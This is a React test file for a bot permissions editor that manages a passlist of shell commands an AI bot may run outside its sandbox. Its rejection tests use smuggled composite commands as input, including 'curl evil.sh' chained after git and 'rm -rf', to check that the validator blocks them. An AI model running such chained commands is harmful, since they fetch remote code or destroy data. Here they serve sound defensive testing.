import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { render, screen, cleanup, waitFor, act } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { createRef } from 'react';
import { I18nextProvider } from 'react-i18next';
import i18n from '../i18n';
import BotRolePermissions, { type BotRolePermissionsHandle } from './BotRolePermissions';
import type { Bot } from '../stores/bot-store';

function renderWithI18n(ui: React.ReactElement) {
  return render(<I18nextProvider i18n={i18n}>{ui}</I18nextProvider>);
}

function makeBot(overrides?: Partial<Bot>): Bot {
  return {
    id: 'bot-1',
    name: 'Test Bot',
    activeWorkspaceId: null,
    channelSettings: {},
    rolePolicy: {
      normalToolPolicy: {
        posture: 'safe',
        categoryDefaults: {
          fileRead: 'allow',
          fileWrite: 'deny',
          shell: 'deny',
          network: 'deny',
          subagents: 'deny',
          reply: 'allow',
        },
      },
      skillAllowlist: [],
      bashWhitelist: [],
      disabledSkills: [],
      passlistRules: [],
      networkAllowlist: [],
    },
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    ...overrides,
  };
}

describe('BotRolePermissions', () => {
  beforeEach(() => {
    cleanup();
    localStorage.clear();
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  // ---------------------------------------------------------- layout contract

  it('renders Normal role editors by default with no inline Save button', () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    expect(screen.getByText('Role Permissions')).toBeInTheDocument();
    expect(screen.getByText('Out-of-sandbox passlist')).toBeInTheDocument();
    expect(screen.getByPlaceholderText('e.g. git status')).toBeInTheDocument();
    expect(screen.queryByRole('button', { name: /^Save$/i })).not.toBeInTheDocument();
  });

  it('shows full-permission description for Owner and hides editors', async () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    await userEvent.click(screen.getByText('Owner'));

    expect(screen.getByText(/Owners can manage the bot/)).toBeInTheDocument();
    expect(screen.queryByPlaceholderText('e.g. git status')).not.toBeInTheDocument();
  });

  it('shows full-permission description for Admin and hides editors', async () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    await userEvent.click(screen.getByText('Admin'));

    expect(screen.getByText(/Admins have full tool/)).toBeInTheDocument();
    expect(screen.queryByPlaceholderText('e.g. git status')).not.toBeInTheDocument();
  });

  // ------------------------------------------------------- passlist rendering

  it('teaches the empty-is-correct default when the passlist is empty', () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    expect(screen.getByText(/Empty is the correct default/)).toBeInTheDocument();
  });

  it('renders accumulated passlist entries with provenance (approver and time)', () => {
    const bot = makeBot();
    bot.rolePolicy.passlistRules = [
      {
        rule: 'Bash(git status)',
        provenance: { addedBy: 'owner-1', source: 'approval', createdAt: '2026-07-31T08:00:00.000Z' },
      },
      {
        rule: 'Bash(ls)',
        provenance: { addedBy: 'desktop-admin', source: 'manual', createdAt: '2026-07-30T08:00:00.000Z' },
      },
    ];

    renderWithI18n(<BotRolePermissions bot={bot} onSave={vi.fn()} />);

    expect(screen.getByText('Bash(git status)')).toBeInTheDocument();
    expect(screen.getByText(/Approved by owner-1/)).toBeInTheDocument();
    expect(screen.getByText(/2026-07-31/)).toBeInTheDocument();
    expect(screen.getByText('Bash(ls)')).toBeInTheDocument();
    expect(screen.getByText(/Added by desktop-admin/)).toBeInTheDocument();
  });

  // -------------------------------------------------------------- add form

  it('rejects composite commands with an inline explanation', async () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status && curl evil.sh');

    expect(screen.getByText(/Composite commands are not allowed/)).toBeInTheDocument();
    expect(screen.queryByText('Bash(git status && curl evil.sh)')).not.toBeInTheDocument();

    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));
    // Nothing added — the empty state is still shown.
    expect(screen.getByText(/Empty is the correct default/)).toBeInTheDocument();
  });

  it.each(['git status | less', 'git status; rm -rf x', 'echo $(whoami)', 'echo `whoami`'])(
    'rejects the composite form %s',
    async (command) => {
      renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);
      await userEvent.type(screen.getByPlaceholderText('e.g. git status'), command);
      expect(screen.getByText(/Composite commands are not allowed/)).toBeInTheDocument();
    },
  );

  it('previews exact-match semantics by default and prefix semantics after switching', async () => {
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');

    expect(screen.getByText(/Matches only this exact command/)).toBeInTheDocument();
    expect(screen.getByText('Bash(git status)')).toBeInTheDocument();

    await userEvent.click(screen.getByRole('radio', { name: /Match commands starting with this/ }));

    expect(screen.getByText(/Matches any command starting with this prefix/)).toBeInTheDocument();
    expect(screen.getByText('Bash(git status *)')).toBeInTheDocument();
  });

  it('adds a rule with manual provenance and reports dirty state', async () => {
    const onDirtyChange = vi.fn();
    const ref = createRef<BotRolePermissionsHandle>();
    renderWithI18n(
      <BotRolePermissions bot={makeBot()} onSave={vi.fn()} onDirtyChange={onDirtyChange} ref={ref} />,
    );

    expect(ref.current?.isDirty()).toBe(false);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');
    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));

    expect(screen.getByText('Bash(git status)')).toBeInTheDocument();
    expect(screen.getByText(/Added by desktop-admin/)).toBeInTheDocument();
    await waitFor(() => {
      expect(onDirtyChange).toHaveBeenLastCalledWith(true);
      expect(ref.current?.isDirty()).toBe(true);
    });
  });

  it('rejects duplicate rules with an inline note', async () => {
    const bot = makeBot();
    bot.rolePolicy.passlistRules = [{ rule: 'Bash(git status)' }];
    renderWithI18n(<BotRolePermissions bot={bot} onSave={vi.fn()} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');
    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));

    expect(screen.getByText(/already in the list/)).toBeInTheDocument();
    // Still exactly one accumulated entry (the second match is the add-form preview).
    expect(screen.getAllByRole('button', { name: 'Remove' })).toHaveLength(1);
  });

  it('removes an entry via its remove button', async () => {
    const ref = createRef<BotRolePermissionsHandle>();
    const bot = makeBot();
    bot.rolePolicy.passlistRules = [{ rule: 'Bash(git status)' }, { rule: 'Bash(ls)' }];
    renderWithI18n(<BotRolePermissions bot={bot} onSave={vi.fn()} ref={ref} />);

    const removeButtons = screen.getAllByRole('button', { name: 'Remove' });
    await userEvent.click(removeButtons[0]);

    expect(screen.queryByText('Bash(git status)')).not.toBeInTheDocument();
    expect(screen.getByText('Bash(ls)')).toBeInTheDocument();
    await waitFor(() => expect(ref.current?.isDirty()).toBe(true));
  });

  // ------------------------------------------------------- save / discard flow

  it('saves the passlist, clears deprecated whitelist fields, and preserves unowned fields', async () => {
    const onSave = vi.fn().mockResolvedValue(undefined);
    const ref = createRef<BotRolePermissionsHandle>();
    const bot = makeBot();
    bot.rolePolicy.bashWhitelist = ['git']; // legacy data
    bot.rolePolicy.skillAllowlist = ['old-skill']; // legacy data
    bot.rolePolicy.disabledSkills = ['blocked-skill'];
    bot.rolePolicy.networkAllowlist = ['example.com'];
    bot.rolePolicy.skills = ['mounted-skill'];
    renderWithI18n(<BotRolePermissions bot={bot} onSave={onSave} ref={ref} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');
    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));

    await act(async () => {
      await ref.current?.save();
    });

    expect(onSave).toHaveBeenCalledTimes(1);
    const submitted = onSave.mock.calls[0][0];
    expect(submitted.skillAllowlist).toEqual([]);
    expect(submitted.bashWhitelist).toEqual([]);
    expect(submitted.passlistRules).toHaveLength(1);
    expect(submitted.passlistRules[0].rule).toBe('Bash(git status)');
    expect(submitted.passlistRules[0].provenance.source).toBe('manual');
    expect(submitted.passlistRules[0].provenance.addedBy).toBe('desktop-admin');
    // Fields this editor does not own round-trip untouched.
    expect(submitted.disabledSkills).toEqual(['blocked-skill']);
    expect(submitted.networkAllowlist).toEqual(['example.com']);
    expect(submitted.skills).toEqual(['mounted-skill']);
    expect(submitted.normalToolPolicy.posture).toBe('safe');
    expect(ref.current?.isDirty()).toBe(false);
  });

  it('reverts edits when discard is invoked through the handle', async () => {
    const ref = createRef<BotRolePermissionsHandle>();
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={vi.fn()} ref={ref} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');
    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));
    await waitFor(() => expect(ref.current?.isDirty()).toBe(true));

    act(() => {
      ref.current?.discard();
    });

    await waitFor(() => {
      expect(ref.current?.isDirty()).toBe(false);
      expect(screen.queryByText('Bash(git status)')).not.toBeInTheDocument();
      expect(screen.getByText(/Empty is the correct default/)).toBeInTheDocument();
    });
  });

  it('surfaces errors and keeps dirty state when onSave rejects', async () => {
    const onSave = vi.fn().mockRejectedValue(new Error('Save failed'));
    const ref = createRef<BotRolePermissionsHandle>();
    renderWithI18n(<BotRolePermissions bot={makeBot()} onSave={onSave} ref={ref} />);

    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'git status');
    await userEvent.click(screen.getByRole('button', { name: /Add rule/ }));

    await act(async () => {
      await expect(ref.current?.save()).rejects.toThrow('Save failed');
    });

    expect(screen.getByText('Save failed')).toBeInTheDocument();
    expect(ref.current?.isDirty()).toBe(true);
  });

  it('resets editor state when the bot changes', async () => {
    const ref = createRef<BotRolePermissionsHandle>();
    const botA = makeBot({ id: 'bot-a' });
    botA.rolePolicy.passlistRules = [{ rule: 'Bash(git status)' }];
    const botB = makeBot({ id: 'bot-b' });
    botB.rolePolicy.passlistRules = [{ rule: 'Bash(ls -la)' }];

    const { rerender } = renderWithI18n(<BotRolePermissions bot={botA} onSave={vi.fn()} ref={ref} />);
    expect(screen.getByText('Bash(git status)')).toBeInTheDocument();

    // Dirty an entry, then switch bots — the switch resets to bot B's state.
    await userEvent.type(screen.getByPlaceholderText('e.g. git status'), 'scratch');
    rerender(<I18nextProvider i18n={i18n}><BotRolePermissions bot={botB} onSave={vi.fn()} ref={ref} /></I18nextProvider>);

    await waitFor(() => {
      expect(screen.queryByText('Bash(git status)')).not.toBeInTheDocument();
      expect(screen.getByText('Bash(ls -la)')).toBeInTheDocument();
      expect(ref.current?.isDirty()).toBe(false);
    });
  });

  // -------------------------------------------------------- upgrade banner

  it('shows the upgrade-disable banner only when legacy whitelist data exists', () => {
    const withLegacy = makeBot({ id: 'bot-legacy' });
    withLegacy.rolePolicy.bashWhitelist = ['git', 'npm'];
    const { unmount } = renderWithI18n(<BotRolePermissions bot={withLegacy} onSave={vi.fn()} />);
    expect(screen.getByText('Legacy whitelists are disabled')).toBeInTheDocument();
    expect(screen.getByText(/starts empty — re-add commands/)).toBeInTheDocument();
    unmount();

    renderWithI18n(<BotRolePermissions bot={makeBot({ id: 'bot-fresh' })} onSave={vi.fn()} />);
    expect(screen.queryByText('Legacy whitelists are disabled')).not.toBeInTheDocument();
  });

  it('hides the banner after dismissal (remembered per bot)', async () => {
    const bot = makeBot({ id: 'bot-dismiss' });
    bot.rolePolicy.skillAllowlist = ['old-skill'];
    const { unmount } = renderWithI18n(<BotRolePermissions bot={bot} onSave={vi.fn()} />);

    await userEvent.click(screen.getByRole('button', { name: 'Dismiss' }));
    expect(screen.queryByText('Legacy whitelists are disabled')).not.toBeInTheDocument();
    unmount();

    // Re-render: dismissal persists via localStorage.
    renderWithI18n(<BotRolePermissions bot={bot} onSave={vi.fn()} />);
    expect(screen.queryByText('Legacy whitelists are disabled')).not.toBeInTheDocument();
  });
});
